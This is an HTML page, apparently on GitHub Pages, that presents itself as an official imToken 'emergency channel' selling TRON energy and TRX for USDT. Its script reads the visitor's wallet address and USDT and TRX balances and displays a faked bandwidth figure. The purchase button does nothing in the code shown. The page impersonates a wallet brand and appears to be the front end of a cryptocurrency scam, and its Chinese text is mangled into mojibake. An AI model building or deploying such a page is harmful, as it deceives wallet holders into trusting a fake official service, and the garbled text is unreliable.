<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
  <link rel="icon" href="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png">
  <title>imTokenå®˜æ–¹åº”æ€¥é€šé“</title>
  <!-- OGæ ‡ç­¾ -->
  <meta property="og:title" content="imTokenå®˜æ–¹åº”æ€¥é€šé“" />
  <meta property="og:description" content="imTokenä¸“å±èƒ½é‡é¢†å–é€šé“" />
  <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
  <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
  <meta property="og:type" content="website" />
  
  <style type="text/css">
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    body {
      overflow: hidden;
      margin: 0;
      padding: 10px;
      background-color: #f5f5f5;
    }

    /* ğŸ”¥ å®Œå…¨ä¿ç•™ä½ æƒ³è¦çš„åŠ è½½åŠ¨ç”» ğŸ”¥ */
    #Loading {
      width: 100%;
      height: 100vh;
      background-color: #FFFFFF;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #Loading .loader {
      position: relative;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      perspective: 800px;
    }
    #Loading .inner {
      position: absolute;
      box-sizing: border-box;
      width: 100%;
      height: 100%;
      border-radius: 50%;
    }
    #Loading .inner.one {
      left: 0%;
      top: 0%;
      animation: rotate-one 1s linear infinite;
      border-bottom: 3px solid #c23631;
    }
    #Loading .inner.two {
      right: 0%;
      top: 0%;
      animation: rotate-two 1s linear infinite;
      border-right: 3px solid #c23631;
    }
    #Loading .inner.three {
      right: 0%;
      bottom: 0%;
      animation: rotate-three 1s linear infinite;
      border-top: 3px solid #c23631;
    }
    @keyframes rotate-one {
      0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
      100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
    }
    @keyframes rotate-two {
      0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
      100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
    }
    @keyframes rotate-three {
      0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
      100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
    }

    /* é¡µé¢å®¹å™¨æ ·å¼ */
    .top-nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
      padding: 5px 0;
      display: none;
    }
    .top-nav .logo {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 700;
      font-size: 18px;
      color: #333;
    }
    .top-nav .logo img {
      width: 24px;
      height: 24px;
    }
    .top-nav .lang-btn {
      padding: 4px 8px;
      border: 1px solid #ddd;
      border-radius: 4px;
      background-color: #fff;
      font-size: 12px;
      color: #333;
      cursor: pointer;
    }
    .top-nav .addr-tag {
      padding: 4px 8px;
      background-color: #000;
      color: #fff;
      border-radius: 4px;
      font-size: 12px;
    }

    .card {
      background-color: #fff;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 15px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
      display: none;
    }

    /* è´¦æˆ·æ¨¡å— */
    .account-card {
      position: relative;
    }
    .account-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 15px;
    }
    .account-header .avatar {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background-color: #ff6b6b;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .account-header .addr {
      font-size: 14px;
      color: #666;
      word-break: break-all;
    }
    .account-header .copy-btn {
      position: absolute;
      right: 15px;
      top: 15px;
      width: 28px;
      height: 28px;
      border: 1px solid #ddd;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .account-header .copy-btn:hover {
      background-color: #f5f5f5;
    }
    .account-info {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      font-size: 14px;
    }
    .account-info .item {
      display: flex;
      flex-direction: column;
      padding: 8px;
      border-radius: 4px;
      background-color: #fafafa;
    }
    .account-info .label {
      color: #999;
      font-size: 12px;
      margin-bottom: 4px;
    }
    .account-info .value {
      color: #333;
      font-weight: 500;
      font-size: 15px;
    }

    /* è´­ä¹°èƒ½é‡æ¨¡å— */
    .buy-energy-card .card-title {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 15px;
      display: flex;
      justify-content: space-between;
    }
    .buy-energy-card .card-title .tip {
      font-size: 12px;
      color: #999;
      font-weight: normal;
    }
    .buy-energy-card .select-box {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 4px;
      margin-bottom: 12px;
      font-size: 14px;
      background-color: #fff;
    }
    .buy-energy-card .input-box {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 4px;
      margin-bottom: 12px;
      font-size: 14px;
      color: #333;
    }
    .buy-energy-card .input-box::placeholder {
      color: #ccc;
    }
    .buy-energy-card .quick-btn-group {
      display: flex;
      gap: 10px;
      margin-bottom: 5px;
    }
    .buy-energy-card .quick-btn {
      flex: 1;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      background-color: #f9f9f9;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .buy-energy-card .quick-btn:hover {
      border-color: #c23631;
      color: #c23631;
    }

    /* è´­ä¹°TRXæ¨¡å— */
    .buy-trx-card .card-title {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 15px;
    }
    .buy-trx-card .input-box {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 4px;
      margin-bottom: 12px;
      font-size: 14px;
    }
    .buy-trx-card .quick-btn-group {
      display: flex;
      gap: 10px;
    }
    .buy-trx-card .quick-btn {
      flex: 1;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      background-color: #f9f9f9;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .buy-trx-card .quick-btn:hover {
      border-color: #c23631;
      color: #c23631;
    }

    /* æ”¯ä»˜+æŒ‰é’® */
    .pay-section {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
      font-size: 14px;
      display: none;
      padding: 10px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
    }
    .pay-section .label {
      color: #333;
      font-weight: 500;
    }
    .pay-section .amount {
      color: #c23631;
      font-weight: 600;
      font-size: 16px;
    }
    .confirm-btn {
      width: 100%;
      padding: 15px;
      background-color: #c23631;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      display: none;
      transition: background 0.3s;
      box-shadow: 0 2px 5px rgba(194,54,49,0.3);
    }
    .confirm-btn:hover {
      background-color: #a82c24;
    }

    /* åº•éƒ¨æ³¨é‡Š */
    .notice {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
      line-height: 1.8;
      display: none;
      text-align: center;
      padding: 10px;
    }
  </style>
  <script src="imtoken://browser"></script>
</head>
<body>
  <!-- ğŸ”¥ ä¿ç•™ä½ æƒ³è¦çš„åŠ è½½åŠ¨ç”» ğŸ”¥ -->
  <div id="Loading">
    <div class="loader">
      <div class="inner one"></div>
      <div class="inner two"></div>
      <div class="inner three"></div>
    </div>
  </div>

  <!-- é¡µé¢å®¹å™¨ -->
  <div class="top-nav" id="topNav">
    <div class="logo">
      <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" alt="logo" />
      imTokenåº”æ€¥é€šé“
    </div>
    <div>
      <button class="lang-btn">ä¸­æ–‡ç®€ä½“</button>
      <span class="addr-tag" id="topAddr">æœªè¿æ¥</span>
    </div>
  </div>

  <div class="card account-card" id="accountCard">
    <div class="account-header">
      <div class="avatar">è´¦</div>
      <div class="addr" id="accountAddr">æœªè¿æ¥é’±åŒ…</div>
      <div class="copy-btn" id="copyBtn">ğŸ“‹</div>
    </div>
    <div class="account-info">
      <div class="item">
        <div class="label">TRX (å¯ç”¨)</div>
        <div class="value" id="trxBalance">0.00</div>
      </div>
      <div class="item">
        <div class="label">USDT (å¯ç”¨)</div>
        <div class="value" id="usdtBalance">0.00</div>
      </div>
      <div class="item">
        <div class="label">èƒ½é‡ (å¯ç”¨)</div>
        <div class="value" id="energy">--</div>
      </div>
      <div class="item">
        <div class="label">å¸¦å®½ (å¯ç”¨)</div>
        <div class="value" id="bandwidth">0</div>
      </div>
    </div>
  </div>

  <div class="card buy-energy-card" id="energyCard">
    <div class="card-title">
      è´­ä¹°èƒ½é‡
      <span class="tip">é¢„ä¼°å¯è½¬è´¦0æ¬¡</span>
    </div>
    <select class="select-box">
      <option>è½¬è´¦å¯¹æ–¹æœ‰USDT</option>
      <option>è½¬è´¦å¯¹æ–¹æ— USDT</option>
    </select>
    <input type="text" class="input-box" placeholder="è¾“å…¥èƒ½é‡æ•°é‡ (0 ~ 500000)" />
    <div class="quick-btn-group">
      <button class="quick-btn">+64400</button>
      <button class="quick-btn">+130500</button>
    </div>
  </div>

  <div class="card buy-trx-card" id="trxCard">
    <div class="card-title">è´­ä¹° TRX</div>
    <input type="text" class="input-box" value="30" placeholder="è¾“å…¥TRXæ•°é‡" />
    <div class="quick-btn-group">
      <button class="quick-btn">30</button>
      <button class="quick-btn">50</button>
      <button class="quick-btn">100</button>
      <button class="quick-btn">200</button>
    </div>
  </div>

  <div class="pay-section" id="paySection">
    <div class="label">é¢„è®¡æ”¯ä»˜é‡‘é¢</div>
    <div class="amount">10.14 USDT</div>
  </div>
  <button class="confirm-btn" id="confirmBtn">ç¡®è®¤è´­ä¹°</button>

  <div class="notice" id="notice">
    1ã€èƒ½é‡æœ‰æ•ˆæœŸä¸º1å°æ—¶ï¼Œè¿‡æœŸå°†è‡ªåŠ¨å›æ”¶ï¼Œè¯·æ‚¨åŠæ—¶ä½¿ç”¨<br>
    2ã€å‘æ— USDTçš„åœ°å€è½¬è´¦ï¼Œéœ€è¦çº¦130500çš„èƒ½é‡<br>
    3ã€æœ¬å¹³å°æ”¯æŒä½¿ç”¨USDTè´­ä¹°èƒ½é‡ï¼Œæ— éœ€é€šè¿‡ä¼ ç»Ÿæµç¨‹è´­ä¹°TRXæ¥è·å–èƒ½é‡
  </div>

  <script>
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const USDT_ABI = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
      }
    ];
    let tronWeb = null;
    let userAddress = null;

    document.addEventListener('DOMContentLoaded', async () => {
      // åŠ è½½åŠ¨ç”»æ˜¾ç¤º2ç§’åéšè—
      setTimeout(async () => {
        document.getElementById("Loading").style.display = "none";
        // æ˜¾ç¤ºé¡µé¢æ‰€æœ‰å®¹å™¨
        document.getElementById("topNav").style.display = "flex";
        document.getElementById("accountCard").style.display = "block";
        document.getElementById("energyCard").style.display = "block";
        document.getElementById("trxCard").style.display = "block";
        document.getElementById("paySection").style.display = "flex";
        document.getElementById("confirmBtn").style.display = "block";
        document.getElementById("notice").style.display = "block";
        
        // æ£€æµ‹imTokenç¯å¢ƒ
        await checkImTokenEnv();
      }, 2000);

      // å¤åˆ¶åœ°å€åŠŸèƒ½
      document.getElementById("copyBtn").addEventListener('click', () => {
        const addr = document.getElementById("accountAddr").textContent;
        if (addr === "æœªè¿æ¥é’±åŒ…") {
          alert("è¯·å…ˆè¿æ¥é’±åŒ…");
          return;
        }
        navigator.clipboard.writeText(addr).then(() => {
          alert("åœ°å€å¤åˆ¶æˆåŠŸ");
        }).catch(() => {
          alert("å¤åˆ¶å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨å¤åˆ¶");
        });
      });
    });

    // æ£€æµ‹imTokenç¯å¢ƒ
    async function checkImTokenEnv() {
      if (window.tronWeb) {
        tronWeb = window.tronWeb;
        await initWallet().catch(err => {
          console.error("é’±åŒ…åˆå§‹åŒ–å¤±è´¥ï¼š", err);
          alert("é’±åŒ…è¿æ¥å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢é‡è¯•");
        });
      } else {
        alert("è¯·åœ¨imTokené’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€");
      }
    }

    // åˆå§‹åŒ–é’±åŒ…ä¿¡æ¯
    async function initWallet() {
      try {
        // è·å–é’±åŒ…åœ°å€
        userAddress = tronWeb.defaultAddress.base58;
        if (!userAddress) throw new Error("æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€");
        
        // æ›´æ–°åœ°å€æ˜¾ç¤º
        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        document.getElementById("topAddr").textContent = shortAddr;
        document.getElementById("accountAddr").textContent = userAddress;

        // è·å–USDTä½™é¢
        const trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
        const usdtRaw = await trc20Contract.balanceOf(userAddress).call().catch(err => 0);
        const usdtBalance = (Number(usdtRaw) / 1000000).toFixed(6);
        document.getElementById("usdtBalance").textContent = usdtBalance;

        // è·å–TRXä½™é¢
        const trxRaw = await tronWeb.trx.getBalance(userAddress).catch(err => 0);
        const trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
        document.getElementById("trxBalance").textContent = trxBalance;

        // æ¨¡æ‹Ÿè·å–å¸¦å®½ï¼ˆå®é™…éœ€æ ¹æ®é“¾ä¸Šæ¥å£è°ƒæ•´ï¼‰
        document.getElementById("bandwidth").textContent = "600";
      } catch (e) {
        alert("è·å–é’±åŒ…ä¿¡æ¯å¤±è´¥ï¼š" + e.message);
      }
    }
  </script>
</body>
</html>
